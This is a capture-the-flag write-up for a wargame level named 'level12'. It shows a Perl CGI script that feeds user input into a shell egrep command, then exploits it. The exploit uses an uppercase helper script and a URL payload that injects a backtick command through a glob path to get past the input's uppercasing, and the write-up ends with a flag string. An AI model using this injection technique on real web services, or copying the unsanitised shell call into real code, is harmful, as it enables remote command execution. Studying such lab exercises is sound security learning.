# level12

`ls`
![[ls.png]]

cat `level12.pl`
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```
> We can see there is a command execution (the `egrep`) that we can try to exploit. Problem is it will turn the letters uppercase and remove everything after the first space

We will first create a script with an uppercase name (here /tmp/GETFLAG)
```sh
#!/bin/sh
getflag > /tmp/flag
```

We now launch `perl level12.pl` and go to `http://localhost:14646/?x=%22%3B%60/*/GETFLAG%60%3B` (or ``http://localhost:14646/?x=";`/*/GETFLAG`;``)

`cat /tmp/flag`
![[flag.png]]
### Flag = g1qKMiRpXf53AWhDaU7FEkczr
